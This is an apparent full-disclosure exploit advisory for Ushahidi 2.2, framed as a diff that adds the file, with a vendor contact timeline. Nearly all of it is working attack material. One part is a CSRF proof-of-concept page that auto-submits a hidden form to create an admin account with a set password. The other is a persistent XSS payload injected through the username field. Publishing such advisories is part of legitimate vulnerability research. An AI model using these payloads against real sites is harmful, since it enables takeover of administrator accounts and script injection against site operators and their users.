@@ -1,0 +1,47 @@
+# Exploit Title: Ushahidi 2.2 Multiple Vulnerabilites
+# Date: 04/12/2012
+# Author: shpendk
+# Software Link: http://download.ushahidi.com/
+# Version: 2.2
+# Tested on: Xampp on Windows
+# Vendor Contact: 		03/25/2012
+-> Contacted again:		03/28/2012
+-> No Response yet:		04/11/2012
+-> Full Disclosure:		04/12/2012
+
+
+
+1) CSRF Add Admin PoC:
+
+-----------------------------------------------------------------------------------------------------
+<html>
+<body>
+<form action="http://127.0.0.1/admin/users/edit" method="POST">
+<input type="hidden" name="name" value="myname">
+<input type="hidden" name="email" value="shpendk13@gmail.com">
+<input type="hidden" name="role" value="admin">
+<input type="hidden" name="username" value="shpendk">
+<input type="hidden" name="notify" value="1">
+<input type="hidden" name="password" value="letmein">
+<input type="hidden" name="password_again" value="letmein">
+</form>
+<script> document.forms[0].submit(); </script>
+
+</body>
+</html>
+		
+-------------------------------------------------------------------------------------------------------
+
+
+
+2) Persistent XSS
+
+------------------------------------------------------------------------------------------------------
+
+	-> Go to http://127.0.0.1/login
+	-> Create New User
+		-> Enter username: <img/onerror="alert(123)"src=a>
+	-> Login as Admin and go to http://127.0.0.1/admin/users
+		
+------------------------------------------------------------------------------------------------------
+
